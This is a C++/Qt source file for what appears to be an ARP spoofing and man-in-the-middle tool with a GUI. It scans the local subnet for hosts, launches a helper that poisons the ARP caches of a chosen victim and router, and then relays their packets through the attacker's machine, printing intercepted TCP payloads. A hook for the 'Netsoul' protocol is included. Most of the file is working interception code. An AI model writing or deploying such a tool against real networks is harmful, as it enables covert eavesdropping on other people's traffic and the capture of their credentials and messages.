#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QtGui/QMessageBox>
#include <QtNetwork/QNetworkInterface>
#include "arprequest.h"
#include <iostream>
#include <QtGui/QTableWidgetItem>
#include <QtGui/QStandardItemModel>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include "rawsocket.h"
#include "netsoul.h"
#include <unistd.h>
#include "rsock.h"

MainWindow::MainWindow(QWidget *parent) :
        QMainWindow(parent),
        ui(new Ui::MainWindow),
        nbItem(0),
        currentProtocol(NULL),
        state(0)
{
    ui->setupUi(this);

    foreach(QNetworkInterface iter, QNetworkInterface::allInterfaces())
        if(iter.isValid())
            if (!iter.hardwareAddress().isEmpty())
            {
        ui->cbInt->addItem(iter.humanReadableName());
        if (iter.humanReadableName() == "eth0")
            ui->cbInt->setEditText("eth0");
    }
    int idx = ui->cbInt->findText("eth0");
    if (idx != -1)
    {
        ui->cbInt->setCurrentIndex(idx);
        fillIps("eth0");
    }

    this->ui->twMain->setColumnWidth(0, 200);
    this->ui->twMain->setColumnWidth(1, 250);
    this->ui->twMain->setSelectionBehavior(QAbstractItemView::SelectRows);
    this->ui->twMain->setSelectionMode(QAbstractItemView::SingleSelection);
    this->statusText = new QLabel(this);
    this->statusText->setText("No scan running");
    this->ui->sbMain->addPermanentWidget(this->statusText, 200);
    this->ui->sbMain->show();


    // FOR UI DEBUG
    //uint8_t dst_hwaddr[6];
    //memset(dst_hwaddr, 0xff, 6);
    //this->addNewItem("Test ", dst_hwaddr);


    QObject::connect(ui->cbInt, SIGNAL(currentIndexChanged(QString)), this, SLOT(fillIps(QString)));
    QObject::connect(ui->btnScan, SIGNAL(clicked()), this, SLOT(scan()) );
    QObject::connect(ui->pbSetDest, SIGNAL(clicked()), this, SLOT(setDest()));
    QObject::connect(ui->pbSetSource, SIGNAL(clicked()), this, SLOT(setSource()));
    QObject::connect(ui->pbSpoof, SIGNAL(clicked()), this, SLOT(startSpoofing()));
    QObject::connect(ui->pbPlay, SIGNAL(clicked()), this, SLOT(play()));
    QObject::connect(this, SIGNAL(destroyed()), this, SLOT(close()));
}

MainWindow::~MainWindow()
{
    delete ui;
    system("pkill fwdPacket");
}



void MainWindow::fillIps(QString interface)
{
    ui->cbIp->clear();
    foreach (QHostAddress h, QNetworkInterface::interfaceFromName(interface).allAddresses())
        if (h.protocol() == QAbstractSocket::IPv4Protocol && h.toString() != "127.0.0.1")
            ui->cbIp->addItem(h.toString());
}

void MainWindow::setDest()
{
    if (this->ui->twMain->selectedItems().count() == 0 || this->ui->twMain->selectedItems().count() > 1)
        QMessageBox::information(this, "Error", "You must select 1 item");
    else
    {
        this->ui->leRouterIP->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 0)->text());
        this->ui->leRouterMAC->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 1)->text());
    }
}

void MainWindow::setSource()
{
    if (this->ui->twMain->selectedItems().count() == 0 || this->ui->twMain->selectedItems().count() > 1)
        QMessageBox::information(this, "Error", "You must select 1 item");
    else
    {
        this->ui->leSourceIP->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 0)->text());
        this->ui->leSourceMAC->setText(this->ui->twMain->item(this->ui->twMain->selectedItems().first()->row(), 1)->text());
    }
}

void MainWindow::play()
{
    if (this->currentProtocol == NULL)
    {
        this->state |= Playing;
        if (this->ui->cbProtocol->currentText() == "Netsoul")
        {
            this->currentProtocol = new Netsoul(this->ui->centralWidget);
            this->currentProtocol->show();
        }
        RAWSocket s;
        s.Create(this->currentHWIndex, ETH_P_IP);


        uint32_t ipA, ipB, myip;
        QHostAddress tmp;
        tmp.setAddress(this->ui->leSourceIP->text());
        ipA = htonl(tmp.toIPv4Address());
        tmp.setAddress(this->ui->leRouterIP->text());
        ipB = htonl(tmp.toIPv4Address());
        tmp.setAddress(this->ui->cbIp->currentText());
        myip = htonl(tmp.toIPv4Address());

        uint8_t macA[6], macB[6], mymac[6];

        mactoa((char*)this->ui->leSourceMAC->text().toStdString().c_str(), (uint8_t *)macA);
        mactoa((char*)this->ui->leRouterMAC->text().toStdString().c_str(), (uint8_t *)macB);
        mactoa((char*)QNetworkInterface::interfaceFromName(ui->cbInt->currentText()).hardwareAddress().toStdString().c_str(), mymac);

        while (this->state & Playing)
        {
            // poll each ms
            if (s.Poll(1000))
            {
                Packet p;
                s.Read(p, true);
                eth* pETH = (eth*)p.getBuffer();
                if (p.Size > sizeof(ip))
                {
                    ip* pIP = static_cast<ip*>(p.getBuffer());
                    //printf("%x = %x %d\n", pIP->ip_dst, pIP->ip_src, ((char *)&pIP->ip_src)[0]);
                    /*

                    */
                    if (pIP->ip_src == ipA && pIP->ip_dst != myip)
                    {
                        std::cout << "\t\tCLIENT" << std::endl;
                        // from "client" to "router"
                        if (pIP->isTCP() && p.Size >= sizeof(tcp))
                        {
                            std::cout << "client talk" << std::endl;
                            tcp* pTCP = (tcp*)p.getBuffer();
                            std::cout << "Source port : " << pTCP->source << std::endl << "Dest port : " << pTCP->dest << std::endl;


                            if (pTCP->ip_len == p.Size - sizeof(tcp))
                                std::cout << "Bonne taille" << std::endl;
                        }
                        memcpy(pETH->ar_tha, macB, 6);
                        memcpy(pETH->ar_sha, mymac, 6);
                    }
                    else if (pIP->ip_dst == ipA)
                    {
                        std::cout << "\t\tROUTER" << std::endl;
                        // from "router" to "client"
                        if (pIP->isTCP() && p.Size >= sizeof(tcp))
                        {
                            std::cout << "router talk" << std::endl;
                            tcp* pTCP = (tcp*)p.getBuffer();
                            std::cout << "Source port : " << pTCP->source << std::endl << "Dest port : " << pTCP->dest << std::endl;

                            if (pTCP->ip_len == p.Size - sizeof(tcp))
                                std::cout << "Bonne taille" << std::endl;


                            write(1, ((char *)p.getBuffer()) + sizeof(tcp), p.Size - sizeof(tcp));
                        }
                        memcpy(pETH->ar_tha, macA, 6);
                        memcpy(pETH->ar_sha, mymac, 6);
                    }
                    else
                    {
                        std::cout << "JUNK PACKET" << std::endl;
                        uint32_t ips = pIP->ip_src;
                        printf("---\nsrc%d.%d.%d.%d\n",
                               ((ips >> 24) & 0xff),
                               ((ips >> 16) & 0xff),
                               ((ips >> 8) & 0xff),
                               ((ips >> 0) & 0xff)
                               );
                        ips = pIP->ip_dst;
                        printf("dst %d.%d.%d.%d\n",
                               ((ips >> 24) & 0xff),
                               ((ips >> 16) & 0xff),
                               ((ips >> 8) & 0xff),
                               ((ips >> 0) & 0xff)
                               );
                        ips = ipA;
                        printf("ipA %d.%d.%d.%d\n",
                               ((ips >> 24) & 0xff),
                               ((ips >> 16) & 0xff),
                               ((ips >> 8) & 0xff),
                               ((ips >> 0) & 0xff)
                               );
                        ips = ipB;
                        printf("ipB %d.%d.%d.%d\n",
                               ((ips >> 24) & 0xff),
                               ((ips >> 16) & 0xff),
                               ((ips >> 8) & 0xff),
                               ((ips >> 0) & 0xff)
                               );
                    }
                }
/*
                if (memcmp(pETH->ar_tha, mymac, 6) == 0 && memcmp(pETH->ar_sha, macA, 6) == 0)
                {
                    memcpy(pETH->ar_tha, macB, 6);
                    memcpy(pETH->ar_sha, mymac, 6);
                }
                else if ((memcmp(pETH->ar_tha, mymac, 6) == 0) && (memcmp(pETH->ar_sha, macB, 6) == 0))
                {
                    memcpy(pETH->ar_tha, macA, 6);
                    memcpy(pETH->ar_sha, mymac, 6);
                }
*/
                //write(1, ((char *)p.getBuffer()) + sizeof(tcp), p.Size - sizeof(tcp));
                s.Write(p);
                //p.getBuffer()
            }
            QCoreApplication::processEvents();
            QCoreApplication::sendPostedEvents(NULL, 0);
            usleep(1000); // sleep 1ms
            /*
            if (static_cast<Netsoul*>(this->currentProtocol)->isProtocol(p))
            {;
            }
            */
            //s.Write(p);
        }
    }

}

void MainWindow::scan()
{
    if (this->state & Scanning)
    {
        this->ui->btnScan->setText("Scan");
        this->state -= Scanning;
    }
    else
    {
        this->ui->btnScan->setText("Stop scan");
        this->statusText->setText("Start scanning ...");
        this->state |= Scanning;
        RAWSocket s;
        this->ui->twMain->clearContents();
        this->ui->twMain->setRowCount(0);
        this->nbItem = 0;
        ARPRequest arpr;
        if (ui->cbIp->count() != 0)
        {
            // get interface ip and mask
            QNetworkInterface currentInterface = QNetworkInterface::interfaceFromName(ui->cbInt->currentText());
            QNetworkAddressEntry currentIP;
            foreach (QNetworkAddressEntry addr, currentInterface.addressEntries())
                if (addr.ip().toString() == ui->cbIp->currentText())
                    currentIP = addr;
            this->currentHWIndex = currentInterface.index();
            s.Create(currentInterface.index(), (uint16_t)ETH_P_ALL);
            unsigned int ip = currentIP.ip().toIPv4Address() & currentIP.netmask().toIPv4Address();
            unsigned int netmask = currentIP.netmask().toIPv4Address();
            QNetworkAddressEntry current;
            uint32_t i = 0;
            while ((++i & ~netmask) && (~i & ~netmask) && this->state & Scanning)
            {
                ip++;
                current.setIp(QHostAddress(ip));
                this->statusText->setText("Scan is running - " + current.ip().toString());
                uint8_t * rep = arpr.doRequest(s, currentInterface, htonl(currentIP.ip().toIPv4Address()), htonl(ip), this->ui->sbTimeout->value());
                if (rep != NULL)
                    this->addNewItem(current.ip().toString(), rep);

                QCoreApplication::processEvents();
            }
            if (this->state & Scanning)
            {
                this->statusText->setText("Scan done");
                this->state -= Scanning;
            }
            else
                this->statusText->setText("Scan aborted");
            this->ui->btnScan->setText("Scan");
        }
    }
}

void	MainWindow::addNewItem(QString const & ip, uint8_t * mac)
{
    this->ui->twMain->setRowCount(this->nbItem + 1);
    QTableWidgetItem* i = new QTableWidgetItem(QStandardItem::UserType);
    i->setText(ip);
    i->setFlags(Qt::ItemIsEditable);
    this->ui->twMain->setItem(this->nbItem, 0, i);

    i = new QTableWidgetItem(QStandardItem::UserType);
    QString macAddr;
    macAddr += QString::number(mac[0], 16) + ":" + QString::number(mac[1], 16) + ":" + QString::number(mac[2], 16) + ":" +
               QString::number(mac[3], 16) + ":" +  QString::number(mac[4], 16) + ":" +  QString::number(mac[5], 16);
    i->setText(macAddr);
    i->setToolTip(macAddr);
    this->ui->twMain->setItem(this->nbItem, 1, i);
    this->nbItem++;
}

void MainWindow::startSpoofing()
{
    if (this->state & Spoofing)
    {
        this->statusText->setText("Spoofing stopped");
        this->ui->pbSpoof->setText("Start Spoofing");
        this->state -= Spoofing;
        system("pkill fwdPacket");
    }
    else
    {
        this->ui->pbSpoof->setText("Stop spoofing");
        this->state |= Spoofing;
        this->statusText->setText("Spoofing ...");
        if (!fork())
            execl("./fwdPacket", "./fwdPacket",
                  ui->cbInt->currentText().toStdString().c_str(),
                  this->ui->leSourceIP->text().toStdString().c_str(),
                  this->ui->leSourceMAC->text().toStdString().c_str(),
                  this->ui->leRouterIP->text().toStdString().c_str(),
                  this->ui->leRouterMAC->text().toStdString().c_str(),
                  (char*)NULL);

        if (!fork())
            execl("./fwdPacket", "./fwdPacket",
                  ui->cbInt->currentText().toStdString().c_str(),
                  this->ui->leRouterIP->text().toStdString().c_str(),
                  this->ui->leRouterMAC->text().toStdString().c_str(),
                  this->ui->leSourceIP->text().toStdString().c_str(),
                  this->ui->leSourceMAC->text().toStdString().c_str(),
                  (char*)NULL);
    }
}
